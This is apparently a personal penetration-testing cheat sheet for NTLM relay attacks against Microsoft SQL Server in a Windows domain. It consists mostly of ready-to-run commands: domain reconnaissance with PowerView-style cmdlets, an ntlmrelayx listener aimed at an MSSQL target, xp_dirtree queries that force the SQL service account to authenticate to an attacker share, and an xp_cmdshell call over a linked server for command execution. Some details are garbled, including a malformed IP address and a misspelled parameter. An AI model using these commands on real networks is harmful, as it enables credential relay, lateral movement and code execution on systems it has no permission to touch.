use
```
https://github.com/CompassSecurity/mssqlrelay 

-check

see if you can relay sqlA to sqlB

```



If you are not aware how to figure out if something is relayable or not, simple trick is:

use Get-SQLServerInfo to see what is the service user

use Get-DomainUser to find that user from domain

Check user SPNs and/or groups to figure out where that user can login
get-netloggedon

Launch ntlmrelayx to listen for inbound connections and to relay to accessible servers


```
$ ntlmrelayx.py -t mssql://102.2.8:14330 -i -smbsupport --no-multirelay
```

use Get-SQLQuery to run xp_dirtree against the ntlmrelayx host

Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.7.246.5\share',1,1"

![[Pasted image 20240126133525.png]]

```
Get-SQLQuery -Userne DBA -Password '' -Instance '10.2.2.16,14330' -Verbose -Query "EXEC master.sys.xp_dirtree '\\10.7.246.5\share', 1, 1"

```


![[Pasted image 20240126135256.png]]

Profit

how you can get output from xp_cmdshell when running over linked server:  

```
`select * from openquery([StageClusterDMSQS001],'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))');`
```